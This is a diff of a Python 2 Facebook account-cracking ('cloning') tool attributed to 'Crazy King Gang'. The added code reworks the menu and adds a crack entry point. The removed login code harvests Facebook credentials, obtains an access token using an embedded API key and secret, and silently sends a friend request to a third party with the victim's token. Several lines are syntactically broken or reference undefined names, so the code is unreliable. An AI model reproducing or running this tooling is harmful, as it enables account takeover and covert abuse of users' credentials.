@@ -2,10 +2,14 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,re
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('python2 muskan.py')
+
+ 
 reload(sys)
 sys.setdefaultencoding('utf8')
- 
-
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
@@ -13,15 +17,19 @@ br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
-def keluar():
-	print "\033[1;96m[!] \x1b[1;91mExit"
+def exit():
+	print "[!] Exit"
 	os.sys.exit()
+
+
 def acak(b):
     w = 'ahtdzjc'
     d = ''
     for i in x:
         d += '!'+w[random.randint(0,len(w)-1)]+i
     return cetak(d)
+
+
 def cetak(b):
     w = 'ahtdzjc'
     for i in w:
@@ -30,11 +38,18 @@ def cetak(b):
     x += '\033[0m'
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
-def jalan(z):
+
+
+def hamza(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
-		time.sleep(00000.1)
+		time.sleep(0.03)
+def hopss(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.1)
 ##### LOGO #####
 logo = """
 ___  ____   _ _____ _   __  ___   _   _ 
@@ -50,157 +65,84 @@ ___  ____   _ _____ _   __  ___   _   _
 \033[1;91mGANG \033[1;93m: \033[1;92mCRAZY KING GANG
 \033[1;97m======================================="""
 def tik():
-	titik = ['.   ','..  ','... ']
+	titik = [".   ","..  ","... "]
 	for o in titik:
-		
-		print("\r\033[1;96m \x1b[1;93mPlease Wait \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)
+
 back = 0
-berhasil = []
-cekpoint = []
+threads = []
+successful = []
+checkpoint = []
 oks = []
+gagal = []
+idh = []
 id = []
-listgrup = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-os.system("clear")
-print "\033[1;97m ========================================="
-print  """\033[1;97m=======================================
-\033[1;91mOWNER  \033[1;93m: \033[1;92mJAM SHAHRUKH X MUSKAN NOOR
-\033[1;91mYouTube \033[1;93m: \033[1;92mJAM SHAHRUKH TECHNICAL
-\033[1;91mGitHub  \033[1;93m: \033[1;92mhttps://github.com/muskanckg
-\033[1;91mGANG \033[1;93m: \033[1;92mCRAZY KING GANG
-\033[1;97m======================================="""
-print " \x1b[1;97m==========================================="
-CorrectUsername = "jam"
-CorrectPassword = "muskan"
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username
-            loop = 'false'
-        else:
-            print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-    else:
-        print "Wrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-def login():
-	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('clear')
-		print logo
-		print " ONLY LOGIN NEW FB ACCOUNT . "
-		print 42*"\033[1;96m="
-		print('\033[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
-		id = raw_input('\033[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;96m \x1b[1;91mIt seems that your account has a checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\033[1;96m \x1b[1;91mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
+emfromfriend = []
+nofromfriend = []
+			
+#Menu
 def menu():
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\033[1;96m \x1b[1;91mToken invalid"
+		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		os.system('python2 muskan.py')
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
-		nama = a['name']
+		name = a['name']
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;96m \033[1;91mIt seems that your account has a checkpoint"
+		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		os.system('python2 muskan.py')
 	except requests.exceptions.ConnectionError:
-		print"\033[1;96m \x1b[1;91mThere is no internet connection"
-		keluar()
+		print"[!] No Connection"
+		time.sleep(1)
+		('python2 muskan.py')
 	os.system("clear")
+	print banner
+	print "|[✓] Name: "+name
+	print "|[✓] ID  : "+id
 	print logo
-	print " THESE COMMANDS ARE ONLY WORKING ON DATA NOT ON WIFI "
-	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH CKG"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
-	pilih()
-def pilih():
-	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if unikers =="":
-		print "\033[1;96m \x1b[1;91mFill in correctly"
-		pilih()
-	elif unikers =="1":
-		super()
-	elif unikers =="0":
-		jalan('Token Removed')
+	print ('                  ')
+	men()
+
+def men():
+	rana = raw_input("Choose Option >>  ")
+	if rana =="":
+		print " Wrong Input"
+		men()
+	elif rana =="1":
+		crack()
+	elif rana =="2":
 		os.system('rm -rf login.txt')
-		keluar()
+		hamza('[✓] Logged Out Successfully')
+		os.system('python2 muskan.py')
 	else:
-		print "\033[1;96m \x1b[1;91mFill in correctly"
-		pilih()
-def super():
+		print "[!] Wrong Input"
+		men()
+	
+##### INFO #####
+def crack():
 	global toket
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;96m \x1b[1;91mToken invalid"
+		print"Token invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		os.system('python2 muskan.py')
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
